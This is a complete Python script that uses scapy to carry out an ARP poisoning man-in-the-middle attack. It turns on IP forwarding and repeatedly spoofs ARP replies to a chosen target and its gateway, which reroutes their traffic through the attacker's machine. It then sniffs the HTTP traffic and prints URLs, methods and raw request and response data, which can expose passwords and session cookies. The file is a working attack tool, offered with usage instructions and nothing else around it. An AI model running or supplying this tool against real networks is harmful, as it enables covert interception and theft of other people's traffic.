#!/usr/bin/python3

# _*_ coding: utf-8 _*_

import os
import sys
import scapy.all as scapy
import threading
from time import sleep
from scapy.layers.http import HTTPRequest, HTTPResponse

# <-- Terminal Color Definitions -->
RED = "\033[0;31m"
YLW = "\033[1;33m"
GRN = "\033[0;32m"
WHITE = "\033[0m"

PACKET_COUNT = 0
# for enabling IP forwarding in Linux
FORWARD_PATH = '/proc/sys/net/ipv4/ip_forward'

# Check for sudo permissions


def check_sudo():
    if os.getuid() != 0:
        print(f"{RED}[!] Run the script with sudo permissions!{WHITE}")
        exit()

# Enable or Disable IP forwarding


def set_ip_forward(enable=True):
    value = '1' if enable else '0'
    os.system(f'echo {value} > {FORWARD_PATH}')
    print(f"{GRN}[+] IP forwarding {'enabled' if enable else 'disabled'}{WHITE}")

# Find the MAC address for a given IP


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    response = scapy.srp(broadcast / arp_request, timeout=3, verbose=False)[0]
    return response[0][1].hwsrc if response else None

# ARP Spoofing


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"{RED}[!] Could not find MAC address for {target_ip}{WHITE}")
        return

    # Sending ARP packets to make target believe our machine is the gateway
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Restore the network to its original state


def restore(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(packet, count=4, verbose=False)
    print(f"{YLW}[!] Restoring network settings for {target_ip} and {gateway_ip}{WHITE}")


# ARP Poisoning Loop


def arp_poison(target_ip, gateway_ip):
    global PACKET_COUNT
    try:
        while True:
            spoof(target_ip, gateway_ip)  # Spoof target
            spoof(gateway_ip, target_ip)  # Spoof gateway
            PACKET_COUNT += 2
            print(f"[+] Sent packets: {PACKET_COUNT}", end="\r")
            sleep(2)
    except KeyboardInterrupt:
        print(f"{RED}\n[!] Stopping ARP Spoofing...{WHITE}")
        restore(target_ip, gateway_ip)

# Packet Sniffing


def packet_sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

# Process each packet (to monitor HTTP requests)


def process_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = packet[HTTPRequest].Host.decode(
        ) + packet[HTTPRequest].Path.decode()
        method = packet[HTTPRequest].Method.decode()
        print(f"{GRN}[+] HTTP Request: {url} | Method: {method}{WHITE}")

        if packet.haslayer(scapy.Raw):
            print(f"{YLW}[+] Raw Data: {packet[scapy.Raw].load}{WHITE}")

    elif packet.haslayer(HTTPResponse):
        print(f"{GRN}[+] HTTP Response Detected{WHITE}")
        if packet.haslayer(scapy.Raw):
            print(f"{YLW}[+] Response Data: {packet[scapy.Raw].load}{WHITE}")


# Main function
if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: sudo python3 advanced_mitm.py -t <target_ip> -g <gateway_ip>")
        exit()

    target_ip = sys.argv[2]
    gateway_ip = sys.argv[4]
    interface = "eth0"  # Change this according to your network interface

    check_sudo()
    set_ip_forward(True)

    try:
        print(f"{GRN}[+] Starting ARP Poisoning attack...{WHITE}")
        poison_thread = threading.Thread(
            target=arp_poison, args=(target_ip, gateway_ip), daemon=True)
        poison_thread.start()

        print(f"{GRN}[+] Starting packet sniffer on {interface}...{WHITE}")
        sniffer_thread = threading.Thread(
            target=packet_sniffer, args=(interface,), daemon=True)
        sniffer_thread.start()

        poison_thread.join()
        sniffer_thread.join()

    except KeyboardInterrupt:
        print(f"\n{RED}[!] Exiting and restoring network...{WHITE}")
        set_ip_forward(False)
        restore(target_ip, gateway_ip)
